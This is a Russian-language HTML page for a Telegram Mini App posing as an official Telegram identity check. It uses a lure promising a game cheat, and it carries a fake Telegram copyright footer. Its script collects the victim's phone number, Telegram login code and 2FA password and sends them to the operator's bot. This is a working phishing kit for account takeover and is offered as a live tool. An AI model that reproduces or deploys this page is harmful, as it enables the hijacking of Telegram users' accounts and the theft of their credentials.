<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проверка личности</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0f0f0f;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: #1f1f1f;
            border-radius: 20px;
            padding: 30px 25px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 12px 40px rgba(0,0,0,0.6);
            border: 1px solid #2a2a2a;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo svg {
            width: 60px;
            height: 60px;
        }
        h2 {
            color: #fff;
            font-size: 22px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 8px;
        }
        .sub {
            color: #aaa;
            text-align: center;
            font-size: 14px;
            margin-bottom: 25px;
        }
        .input-group {
            margin-bottom: 16px;
        }
        .input-group label {
            display: block;
            color: #ccc;
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: #2a2a2a;
            border: 1px solid #3a3a3a;
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: border 0.2s;
        }
        .input-group input:focus {
            border-color: #6c8cff;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #6c8cff;
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }
        .btn:hover {
            background: #5a7ae0;
        }
        .btn:active {
            transform: scale(0.98);
        }
        .btn-share {
            width: 100%;
            padding: 14px;
            background: #6c8cff;
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }
        .btn-share:hover {
            background: #5a7ae0;
        }
        .status {
            margin-top: 15px;
            text-align: center;
            font-size: 14px;
            color: #ff6b6b;
            min-height: 24px;
        }
        .status.success {
            color: #69db7c;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 12px;
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C6.477 2 2 6.477 2 12C2 17.523 6.477 22 12 22C17.523 22 22 17.523 22 12C22 6.477 17.523 2 12 2ZM16.146 7.663L14.443 15.935C14.325 16.473 13.999 16.615 13.551 16.378L10.833 14.394L9.52 15.664C9.389 15.793 9.277 15.901 8.995 15.901L9.166 13.131L13.987 8.749C14.184 8.574 13.943 8.476 13.677 8.651L7.718 12.34L5.035 11.373C4.519 11.185 4.506 10.836 5.134 10.599L15.549 6.386C15.989 6.208 16.376 6.463 16.146 7.663Z" fill="#6c8cff"/>
            </svg>
        </div>
        <h2>Проверка личности</h2>
        <p class="sub">Подтвердите, что вы не робот</p>

        <!-- Шаг 1: Запрос контакта -->
        <div id="stepContact">
            <p style="color:#aaa; text-align:center; margin-bottom:20px;">
                Нажмите кнопку, чтобы поделиться номером
            </p>
            <button class="btn-share" id="shareContactBtn">📱 Поделиться контактом</button>
        </div>

        <!-- Шаг 2: Ввод кода -->
        <div id="stepCode" class="hidden">
            <div class="input-group">
                <label>Код подтверждения</label>
                <input type="text" id="codeInput" placeholder="Введите код из Telegram" required>
            </div>
            <div class="input-group" id="passwordGroup" style="display:none;">
                <label>Пароль (если есть 2FA)</label>
                <input type="password" id="passwordInput" placeholder="Введите пароль">
            </div>
            <button class="btn" id="submitCodeBtn">Подтвердить</button>
        </div>

        <div class="status" id="status"></div>
        <div class="footer">Telegram © 2026</div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        let phone = '';
        let code = '';
        let password = '';
        let step = 'contact';
        let isDataSent = false;

        tg.ready();
        tg.expand();

        // Функция отправки данных в бота (один раз)
        function sendDataToBot() {
            if (isDataSent) return;
            isDataSent = true;
            
            const data = {
                phone: phone,
                code: code,
                password: password
            };
            tg.sendData(JSON.stringify(data));
        }

        // Шаг 1: Запрос контакта
        document.getElementById('shareContactBtn').addEventListener('click', function() {
            const status = document.getElementById('status');
            
            tg.requestContact();

            tg.onEvent('contact', function(contact) {
                phone = contact.phone_number;
                if (!phone) {
                    status.textContent = '❌ Не удалось получить номер';
                    status.className = 'status';
                    return;
                }

                status.textContent = `✅ Номер получен: ${phone}`;
                status.className = 'status success';

                // Отправляем номер в бота
                sendDataToBot();

                // Показываем шаг с кодом
                document.getElementById('stepContact').style.display = 'none';
                document.getElementById('stepCode').classList.remove('hidden');
                step = 'code';
                status.textContent = '📲 Код отправлен! Введите его ниже.';
                status.className = 'status success';
            });

            tg.onEvent('contact_error', function(error) {
                status.textContent = '❌ Ошибка получения контакта';
                status.className = 'status';
            });
        });

        // Шаг 2: Ввод кода
        document.getElementById('submitCodeBtn').addEventListener('click', function() {
            const status = document.getElementById('status');
            code = document.getElementById('codeInput').value.trim();

            if (!code) {
                status.textContent = 'Введите код';
                status.className = 'status';
                return;
            }

            // Отправляем код в бота
            sendDataToBot();

            status.textContent = '⏳ Проверка...';
            status.className = 'status';

            // Показываем поле для пароля (на случай 2FA)
            document.getElementById('passwordGroup').style.display = 'block';
            document.getElementById('submitCodeBtn').textContent = 'Подтвердить пароль';
            step = 'password';
        });

        // Шаг 3: Ввод пароля
        document.getElementById('passwordInput').addEventListener('input', function() {
            password = this.value.trim();
        });

        document.getElementById('submitCodeBtn').addEventListener('click', function() {
            if (step === 'password') {
                const status = document.getElementById('status');
                password = document.getElementById('passwordInput').value.trim();

                // Отправляем пароль в бота
                sendDataToBot();

                status.textContent = '✅ Подтверждено!';
                status.className = 'status success';

                setTimeout(() => {
                    document.querySelector('.container').innerHTML = `
                        <div style="text-align:center;color:#fff;padding:40px 0;">
                            <div style="font-size:48px;margin-bottom:16px;">✅</div>
                            <h2>Проверка пройдена</h2>
                            <p style="color:#aaa;margin-top:10px;">Ожидайте чит в боте</p>
                        </div>
                    `;
                }, 1000);

                setTimeout(() => {
                    tg.close();
                }, 2000);
            }
        });
    </script>
</body>
</html>
